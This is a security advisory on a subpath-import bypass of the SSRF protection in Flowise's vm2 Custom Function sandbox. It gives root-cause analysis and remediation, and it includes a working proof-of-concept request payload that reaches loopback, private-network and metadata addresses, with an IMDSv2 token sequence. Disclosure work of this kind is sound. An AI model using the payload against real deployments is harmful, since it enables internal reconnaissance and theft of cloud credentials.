# Flowise SSRF Protection Bypass via Subpath Imports

> **TL;DR** — An authenticated Flowise Custom Function bypasses the sandbox's SSRF protection with a
> one-line change: `require('node-fetch/lib/index.js')` instead of `require('node-fetch')`. The vm2
> `mock` that installs the secure HTTP wrapper is keyed on the *exact* module specifier, so a subpath of
> the same package resolves to the real, unwrapped client — defeating the deny list, the DNS-rebinding
> pin, and the per-hop redirect re-validation. No configuration is required. Affects `flowise` /
> `flowise-components`; runtime-confirmed on **3.1.4** (final; archived; still on npm), with the
> vulnerable source pattern present back through 3.0.13. CWE-918; CVSS 8.4 / 8.5 (High, reporter-proposed).

This report documents a vulnerability in an archived product that remains installed from npm, so there is
no vendor remediation path: the repository is archived, its `SECURITY.md` states that new security reports
are no longer accepted, and `3.1.4` is the final release and remains the latest on npm.

| | |
|---|---|
| **Supplier** | FlowiseAI |
| **Product** | Flowise — npm packages `flowise` and `flowise-components` |
| **Affected** | `flowise-components`. Runtime-confirmed on **3.1.4** (final release, 2026-07-29; image `flowiseai/flowise:3.1.4`). The vulnerable source pattern (exact-specifier `mock` wrapper + `axios`/`node-fetch` appended to the allowlist unconditionally) is present in **every release examined from 3.0.13 through 3.1.4**. No patch exists — the repository is archived. |
| **Vulnerability type** | Server-Side Request Forgery (CWE-918) — SSRF-protection bypass |
| **Affected component / code path** | `packages/components/src/utils.ts` (the vm2 `NodeVM` `mock` wrapper), bypassing `packages/components/src/httpSecurity.ts` |
| **Precondition** | No additional configuration (no environment variable required); an authenticated user holding one of the permissions below. |
| **Credentials** | An API key or session carrying `chatflows:create\|update` or `agentflows:create\|update` (measured; CVSS `PR:L`) |
| **Severity (reporter-proposed)** | CVSS:4.0 **8.4 (High)** `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:L/SA:N` · CVSS:3.1 **8.5 (High)** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`. Offered for the assigning CNA to validate. |

---

## Summary

Flowise runs user-authored Custom Functions inside a vm2 sandbox. To make outbound HTTP safe, the sandbox
replaces `axios` and `node-fetch` with wrapped versions that enforce a deny list (loopback, private
ranges, and the cloud metadata addresses), pin the resolved IP against DNS rebinding, and re-validate
every redirect hop.

The replacement uses vm2's `mock` option, which is keyed on the **exact** module specifier. A subpath of
the same package is a different string, so it is not that key, and the sandbox resolves the real,
unwrapped module:

```javascript
require('node-fetch')               // the wrapper, deny list enforced
require('node-fetch/lib/index.js')  // the real module, no deny list
```

`axios` and `node-fetch` are in the sandbox's external allowlist unconditionally, so this holds on a
stock deployment with no environment variables set.

Measured in the published image, with the environment emptied, against a denied address:

```
require('axios')                      blocked   isDeniedIP: Access to this host is denied by policy.
require('axios/dist/node/axios.cjs')  reached   pong
require('node-fetch')                 blocked   isDeniedIP: Access to this host is denied by policy.
require('node-fetch/lib/index.js')    reached   pong
require('acorn')                      refused   Cannot find module 'acorn'
```

The five calls use the same URL and the same deny list and differ only in the specifier passed to
`require`. Rows 1 and 3 show the wrapper is active, so rows 2 and 4 are not a deployment with the
protection switched off. Row 5 shows the allowlist itself still refusing packages outside it. Both wrapped
modules show the same asymmetry, which places the cause in the `mock` matching rule rather than in either
package. The response body is returned, so this is a read primitive.

## Relationship to prior advisories

Four published advisories have already closed four ways around this same Custom Function SSRF wrapper, all
patched at or before `3.1.3`. This report concerns a fifth, open on `3.1.4`.

| Advisory | Mechanism | Vulnerable | Patched |
|---|---|---|---|
| CVE-2026-41270 / GHSA-xhmj-rg95-44hv | `http`, `https`, `net` passed through `builtinDeps` with no deny-list check | `<= 3.0.13` | `3.1.0` |
| CVE-2026-41272 / GHSA-2x8m-83vc-6wv4 | logic inside `secureAxiosRequest` / `secureFetch` — DNS-rebinding TOCTOU, deny list not enforced by default | `<= 3.0.13` | `3.1.0` |
| CVE-2026-43995 / GHSA-qqvm-66q4-vf5c | Flowise's own tool files import raw `axios` / `node-fetch` instead of the wrapper | `<= 3.0.13` | `3.1.0` |
| CVE-2026-69257 / GHSA-c6xh-wv4j-ppv5 | `isDeniedIP` does not normalise IPv4-mapped IPv6 before the deny-list loop | `<= 3.1.2` | `3.1.3` |

Each closed a different route: a different module, the wrapper's internals, first-party code that skipped
the wrapper, and the deny list's address parsing. Here the wrapper is present, correct, and registered,
and the sandbox hands out an unwrapped copy of the module it wraps.

CVE-2026-41270 is the closest: it quotes the same configuration, including the comment
`mock: secureWrappers`, and reasons from the narrowness of that mock set. Its exit was the built-in
modules; ours is the same package through a subpath. The observation that the mock set is narrow is
published. What is not published is that the mock can be evaded without leaving the two packages it
covers.

## What is bypassed

`packages/components/src/httpSecurity.ts` (line numbers from tag `flowise@3.1.4`):

| Line | Control |
|---|---|
| `:11` | `'127.0.0.0/8'` |
| `:12` | `'169.254.0.0/16'` |
| `:13`, `:14` | `'169.254.169.253'`, `'169.254.169.254'` — the cloud metadata addresses |
| `:25`, `:26` | `'localhost'`, `'ip6-localhost'` |
| `:57` | `isDeniedIP(ip, denyList): void` |
| `:121` | `checkDenyList(url): Promise<void>` |
| `:156` | `secureAxiosRequest(...)` — resolve, validate, pinned agent |
| `:235` | `secureFetch(...)` — the same |
| `:243` | `redirect: 'manual'` — so each hop is re-validated |
| `:247` | `createPinnedAgent(resolved, ...)` |

These controls are not reached: the function that calls them is never the function the sandboxed code
receives.

## Root cause — two properties

**1. `mock` is keyed on the exact specifier.** `packages/components/src/utils.ts`:

```ts
:1738   const secureWrappers: ICommonObject = {}
:1753   secureWrappers['axios'] = secureAxiosWrapper
:1759   secureWrappers['node-fetch'] = secureNodeFetch
:1770           mock: secureWrappers // Replace HTTP libraries with secure wrappers
```

The keys are `'axios'` and `'node-fetch'`. `'node-fetch/lib/index.js'` is a different string, so vm2 finds
no mock for it and resolves it normally.

**2. The allowlist admits every file under an allowlisted package.** The external allowlist becomes a
regular expression whose trailing path group is optional and unbounded:

```js
// vm2/lib/resolver-compat.js:36-39   (vm2@3.11.2, the pinned version)
return new RegExp(`[\\\\/]node_modules[\\\\/]${regexString}(?:[\\\\/](?!(?:.*[\\\\/])?node_modules[\\\\/]).*)?$`);
```

So the subpath is not merely unmocked, it is permitted.

Both packages are in the allowlist with no configuration:

```ts
:116    const defaultAllowExternalDependencies = ['axios', 'node-fetch']
:1733   let deps = process.env.ALLOW_BUILTIN_DEP === 'true' ? availableDependencies.concat(externalDeps) : externalDeps
:1734   deps.push(...defaultAllowExternalDependencies)
```

`:1734` runs unconditionally, after the ternary, so those two names are present in `deps` on every
deployment.

## How far the subpath surface extends

What re-closes a package's subpaths is Node's `exports` map, and only for packages that publish one:

- **`node-fetch` has no `exports` map.** `flowise-components` declares it with the range `^2.6.11`
  (version 2), so every file inside the package resolves.
- **`axios` has an `exports` map and is still bypassable.** The map narrows the surface without closing
  it, because one declared entry is the real client:

```
OK     require('axios/dist/node/axios.cjs')     a declared export
FAIL   require('axios/index.js')                Package path './index.js' is not exported
FAIL   require('axios/lib/axios.js')            Package path './lib/axios.js' is not exported
```

Adding or tightening an `exports` map is therefore not sufficient: a package needs only one exported path
that returns the real module, and `axios` has one.

## Proof of concept

Reproduced on the published image, pinned by digest, with the vendor-default configuration (Postgres
behind it, **no environment variables set** — `ALLOW_BUILTIN_DEP`, `HTTP_DENY_LIST`, `HTTP_SECURITY_CHECK`
all ship commented out in the vendor's own `docker/.env.example`). The wrappers are therefore the real
`secureAxiosRequest` and `secureFetch`, not stubs.

```
flowiseai/flowise:3.1.4   @sha256:3922767afb52a5777759fd8b28a3c9eee864daea96018a791f2429eae2a76571
```

Inside this image the globally installed `flowise` package reports `3.1.2`, while the bundled
`flowise-components` — where the defect lives (`packages/components/src/utils.ts`) — reports `3.1.4`. The
cited line numbers were read from the `flowise@3.1.4` source tag and match the compiled code in the image.

The endpoint accepts a single HTTP request, authenticated with an API key that carries one of the
permissions the route declares; no session cookie or browser is involved:

```
POST /api/v1/node-custom-function HTTP/1.1
Host: <flowise>
Authorization: Bearer <api key>
Content-Type: application/json

{"javascriptFunction":"return (async () => { const ax = require('axios/dist/node/axios.cjs'); const r = await ax.get('http://127.0.0.1:3000/api/v1/ping'); return { denied_target: 'http://127.0.0.1:3000/api/v1/ping', body: r.data, status: r.status }; })()"}
```

```
HTTP 200
{"denied_target":"http://127.0.0.1:3000/api/v1/ping","body":"pong","status":200}
```

`127.0.0.0/8` is on the deny list at `httpSecurity.ts:11`; the response body was returned.

**Credential paths (measured).** The route's authorization was exercised directly:

```
no credentials                                      401  Unauthorized Access
API key scoped ["organization","workspace"] only    403  Forbidden
API key with chatflows:create|update,
  agentflows:create|update                          200
session cookie (baseline)                           200
```

Unauthenticated requests are refused on both paths, and a valid API key is refused unless its scope
includes one of the route's permissions — the `403` control shows a `200` is not an open endpoint. The
permissions are declared at `packages/server/src/routes/node-custom-functions`, and any one of them
suffices.

**A service bound to loopback only, never published.** To rule out "that port was open anyway," a second
service was started inside the container bound to `127.0.0.1:9931` only, serving a host-planted marker:

```
host      -> 127.0.0.1:9931        HTTP 000   connection refused
container -> 127.0.0.1:9931        HTTP 200
published ports                    flowise 3100->3000 only; 9931 absent

require('axios/dist/node/axios.cjs')  reached   {"service":"internal-only","fake_token":"LOOPBACK-ONLY-FAKE-..."}
```

The marker is generated on the host and appears in the sandboxed code's response; those bytes exist only
on that loopback-only service.

**A different host on a private range, and a scan.** The compose network is `192.168.0.0/20`, inside the
deny list's `192.168.0.0/16`. A neighbouring container at `192.168.0.4:8099` (no published ports, its own
marker) was reached while `.1/.2/.3` returned `closed` and `.5–.8` returned `no_host` — so the internal
network can be enumerated, and the marker came back, so it is a read primitive.

**Arbitrary method and body, not just GET.** The subpath returns the unwrapped `axios`, so method,
headers and body are the caller's to choose. A `POST` with a per-run nonce was delivered to two denied
addresses; both echoed back `"method":"POST"` and the body, and both **persisted** the write, which was
then read back out of band by a `docker exec` from the host (a different observer than the sandbox that
wrote it).

**The metadata address.** Bypass of the single `isDeniedIP` check is additionally measured against
`169.254.169.254` using a responder we stood up inside our own container (the document it serves is
fabricated — **no real credential was retrieved**). This required a test overlay adding `NET_ADMIN` purely
to bind that address; a bare container refuses `ip addr add` with `Operation not permitted`. It stands in
for a deployment that already has a metadata service there. `isDeniedIP` is one array and one check, and
its bypass is now measured on three of its entries: loopback, private range, and the link-local metadata
address.

**IMDSv2 handshake (local responder).** The subpath returns the unmodified `axios` (version `1.15.0`,
the pin in `flowise-components`), so the metadata exchange is not limited to a single `GET`. Against a
local responder implementing the tested IMDSv2 request sequence — `PUT /latest/api/token` with the TTL
header, then a `GET` gated on the `x-aws-ec2-metadata-token` header, and an unauthenticated `GET` rejected
with `401` — the unmodified client completed the exchange:

```
[control] GET creds, no token     -> HTTP 401  Unauthorized
[step1]   PUT token (TTL header)   -> HTTP 200  token
[step2]   GET creds (token header) -> HTTP 200  {"Code":"Success","AccessKeyId":"ASIA...", ...}
```

The responder and the credential document are ours and fabricated. This isolates the handshake mechanics:
it was run with the unwrapped client directly, not re-driven through the sandbox at the metadata address
(that reach is established above). Real-cloud hop-limit enforcement and actual credential issuance were
not evaluated. Evidence and the harness are available on request.

## Impact

An authenticated user holding a low-privilege flow-editing API key turns the Flowise server into an SSRF
proxy: the HTTP wrapper's controls do not apply — its deny list, its DNS-rebinding pin, and its per-hop
redirect re-validation all live in the function that is never called — and the sandboxed code receives a
full HTTP client: arbitrary method, headers and body, not only `GET`. Controls outside the wrapper, such
as network egress filtering, are unaffected and still apply. No configuration is required. What this
yields was measured:

- **Internal reconnaissance.** Hosts on the server's private network are enumerable — open, closed and
  absent are distinguishable across a range.
- **Read of internal-only services.** A service bound to loopback and never published, and a separate host
  on a private range, were both read in full. That is the class of target operators place there precisely
  because they assume it unreachable: internal admin consoles, databases, caches, metrics and debug
  endpoints.
- **Writes to internal services.** A `POST` crossed the boundary, was accepted and persisted on the
  target, and was confirmed out of band — so the primitive is not read-only.
- **The cloud-metadata path.** The deny list names `169.254.169.254` and `fd00:ec2::254` explicitly,
  because on a cloud instance that address serves IMDS credentials; the same `isDeniedIP` check is
  bypassed on that entry as well. We reached only a responder we stood up and did not retrieve a real
  credential (see Proof of concept); on a deployment that exposes IMDS this is the credential-theft path
  the control was built to block. Because the bypass returns the full, unwrapped HTTP client, the exchange
  is not limited to a single `GET`: against a local responder implementing the tested IMDSv2 request
  sequence, the unwrapped `axios` completed the `PUT`-token → token-gated `GET` exchange (the no-token
  `GET` being rejected with `401`). This confirms client support for the token exchange; it does not
  establish whether IMDSv2 protections are effective in a particular cloud deployment, and real credential
  issuance was not exercised.

The precondition is only a credential an ordinary flow-editing user already holds; the realised impact
scales with the server's network position.

## Severity

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:L/SA:N   8.4 High
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N                      8.5 High
```

This is the reporter's proposed vector, for the assigning CNA to validate. `AT:N` and no configuration
precondition: the environment was emptied and `axios`/`node-fetch` are appended to the allowlist
unconditionally. `PR:L` rather than `PR:N` or `PR:H`: unauthenticated requests are refused (401), a valid API key whose
scope lacks the route's permissions is also refused (403), and the request succeeds only with
`chatflows:create|update` or `agentflows:create|update` — a low-privilege scope an ordinary flow-editing
user holds, not an administrator. The credential may be a long-lived API key rather than a browser session. `VC:H` and `SC:H`
rest on the reads above — a loopback-only service, a separate private-range host, and the deny-listed
metadata address were each read, with host-planted markers returned. Those targets were ones we
controlled, so these axes reflect the demonstrated read capability rather than confirmed disclosure of
third-party data; the realised confidentiality impact depends on the deployment and is left to the CNA to
weigh. For comparison, CVE-2026-69257 (same deny list, same class of defect) carries `VC:H` at `AT:P`. `VI:N` because reading and writing other hosts
does not alter Flowise itself; the write lands on subsequent systems, scored `SI:L` because the targets
are echo/store servers we ran rather than a real service changing consequential state.

## Mitigation for operators

We found no environment variable that turns this off. The controls available are outside the application:
network-level egress filtering from the Flowise container, and restricting who holds `chatflows:*` and
`agentflows:*` permissions. Requiring IMDSv2 is defense-in-depth here: the local test confirms the client
supports the token exchange (see Impact), but it does not establish whether IMDSv2 protections are
effective in a particular cloud deployment. IMDSv2 also does not address SSRF to other internal services.

## Suggested remediation (for downstream forks / redistributors)

1. Key the `mock` on the package rather than the specifier, so any specifier resolving inside `axios` or
   `node-fetch` gets the wrapper.
2. Do not rely on `exports` maps: `axios` has one and is still bypassable through a declared export.
3. Enforce at the socket rather than at the library — an outbound allowlist in the runtime or the network
   does not care which module opened the connection. The four prior advisories and this one are five
   different ways around the named-import convention.
4. Reject import specifiers containing `/` after the package name.

## Scope and limitations

This research is local static analysis plus reproduction against the vendor's own published container
images; no traffic was sent to any third-party or production instance. The `169.254.169.254` responder and
all scan targets are services we started inside our own containers, with fabricated markers; no real
credential was retrieved and no external infrastructure was touched. Methodology: source review against
tag `flowise@3.1.4`, a completeness-checked claim corpus of the repository's public issues/PRs/comments
and 130 published advisories, and local reproduction.

**Affected-range basis.** `src/utils.ts` from the npm `flowise-components` packages 3.0.13, 3.1.0, 3.1.1,
3.1.2, 3.1.3 and 3.1.4 was reviewed; every one carries the exact-specifier `mock` wrapper and the
unconditional `deps.push(...defaultAllowExternalDependencies)` with `axios`/`node-fetch`. Only 3.1.4 was
exercised at runtime. The deny-list control this bypasses was itself introduced and hardened across
3.1.0–3.1.3 (see the prior-advisory table), so the bypass is most clearly impactful on 3.1.0 and later;
earlier releases carry the pattern but had other, separately-tracked gaps in the same control.

## Disclosure

Reported to VulnCheck for coordinated disclosure (CVD) as a single finding; a CVE assignment with the
**Unsupported When Assigned** tag is being requested, since the product is archived but still installed
(`flowise` and `flowise-components` remain on npm at `3.1.4`). This public reference exists to satisfy the
CNA's public-reference requirement for that assignment.
